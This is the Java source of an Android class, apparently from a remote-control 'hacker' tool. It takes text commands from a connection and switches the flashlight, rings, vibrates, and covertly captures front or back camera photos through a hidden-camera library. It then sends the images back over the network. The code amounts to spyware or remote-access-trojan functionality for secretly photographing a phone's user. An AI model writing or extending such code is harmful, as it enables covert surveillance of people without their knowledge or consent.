package com.androidremote.hacker.tools;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.camera2.CameraAccessException;
import android.media.MediaPlayer;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import android.widget.ImageView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;

import com.androidhiddencamera.CameraConfig;
import com.androidhiddencamera.HiddenCameraActivity;
import com.androidhiddencamera.config.CameraFacing;
import com.androidhiddencamera.config.CameraFocus;
import com.androidhiddencamera.config.CameraImageFormat;
import com.androidhiddencamera.config.CameraResolution;
import com.androidhiddencamera.config.CameraRotation;
import com.androidremote.hacker.Outils;
import com.androidremote.hacker.R;
import com.androidremote.hacker.picture.ShowPicture;

import java.io.File;

// LPDV1 LPDV0 LPDR1 LDR0
// APL1 APL0
// VIBR
// PHDR PHDR


public class Remote extends HiddenCameraActivity {
    public static Activity act;
    public static Context context;
    public static Activity panel_act;
    public static Context panel_context;

    public static byte[] imgSended;


    public static boolean call(String name){
        Log.e("KKKKKKKKKKKKKKK","Action for : "+name);

        switch (name){
            case "LPDV1":
                CreateConnection.sendStrings("OK");
                try {
                    Lampe.startdevant(act,1);
                } catch (Exception e) {
                    e.printStackTrace();
                }


                break;
            case "LPDV0":
                CreateConnection.sendStrings("OK");
                try {
                    Lampe.startdevant(act,0);
                } catch (Exception e) {
                    e.printStackTrace();
                }

                break;
            case "LPDR1":
                CreateConnection.sendStrings("OK");
                Log.e("KKKKKKKKKKKKKKK","LPDR1");
                try {
                    Lampe.startderriere(act,1);
                } catch (Exception e) {
                    e.printStackTrace();
                }

                break;
            case "LPDR0":
                CreateConnection.sendStrings("OK");
                try {
                    Lampe.startderriere(act,0);
                } catch (Exception e) {
                    e.printStackTrace();
                }

                break;
            case "APL1":
                CreateConnection.sendStrings("OK");
                Sonnerie.start();
                Log.e("KKKKKKKKKKKKKKK","APL1");

                break;
            case "APL0":
                CreateConnection.sendStrings("OK");
                Log.e("KKKKKKKKKKKKKKK","APL0");
                Sonnerie.stop();

                break;
            case "VIBR":
                CreateConnection.sendStrings("OK");
                Log.e("KKKKKKKKKKKKKKK","VIBR");
                Vibration.start(1,act);

                break;
            case "PHDR":
                Log.e("PHDR Service","PHDR");
//                CreateConnection.sendStrings("OK");
                try {
                    GetPicture getPicture = new GetPicture(0, context, act);
                    while (getPicture.good != true){
                        Log.e("PHDR Service","Not ready!");
                    }
//                    CreateConnection.sendStrings("OK");
                    CreateConnection.sendImage(getPicture.file.length, getPicture.file);
//                    CreateConnection.sendImageLenght(String.valueOf(getPicture.file.length));
//                    CreateConnection.sendByte(getPicture.file);
                    Log.e("PHDR Service","Picture Remote sent");
                }catch (Exception e){
//                    CreateConnection.sendStrings("OK");
                    CreateConnection.sendStrings("ERROR");
                    Log.e("PHDR Service","Picture Remote sent ERROR");
                }

                //CreateConnection.sendByte(getPicture.file);


                break;
            case "PHDV":
                Log.e("PHDV Service","PHDV");
//                CreateConnection.sendStrings("OK");
                try {
                    GetPicture getPictures = new GetPicture(1, context, act);
                    while (getPictures.good != true){
                        Log.e("PHDV Service","Not ready!");
                    }

                    Log.e("PHDV Service","Ready!!!");
                    //CreateConnection.sendByte(getPicture.file);
//                Commandes.alerteImage(act, context,getPictures.file);
//                    CreateConnection.sendStrings("OK");
//                    CreateConnection.sendImageLenght(String.valueOf(getPictures.file.length));
//                    CreateConnection.sendByte(getPictures.file);
                    CreateConnection.sendImage(getPictures.file.length, getPictures.file);
                    Log.e("PHDV Service","Picture Remote sent");
                } catch (Exception e){
//                    CreateConnection.sendStrings("OK");
                    CreateConnection.sendStrings("ERROR");
                    Log.e("PHDV Service","Picture Remote sent ERROR");
                }

            default:
                return false;
        }
        return true;
    }

    @Override
    public void onImageCapture(@NonNull File imageFile) {
        //Toast.makeText(context, "Coucou Hibou!!!", Toast.LENGTH_LONG).show();
        //BitmapFactory.Options options = new BitmapFactory.Options();
        //options.inPreferredConfig = Bitmap.Config.RGB_565;
        //Bitmap bitmap = BitmapFactory.decodeFile(imageFile.getAbsolutePath(), options);
        CreateConnection.sendStrings("HumHum");
        //Display the image to the image view
        //((ImageView) findViewById(R.id.img_show_picture)).setImageBitmap(bitmap);
    }

    @Override
    public void onCameraError(int errorCode) {

    }

    public static class Sonnerie{
        public static MediaPlayer music;
        public static Context muContext;
        public static void start(){
            music = MediaPlayer.create(muContext, Settings.System.DEFAULT_RINGTONE_URI);
            music.start();
        }


        public static void stop(){
            if(music!=null && music.isPlaying()){
                music.stop();
                music.reset();
                music.release();
            }
        }
    }
}
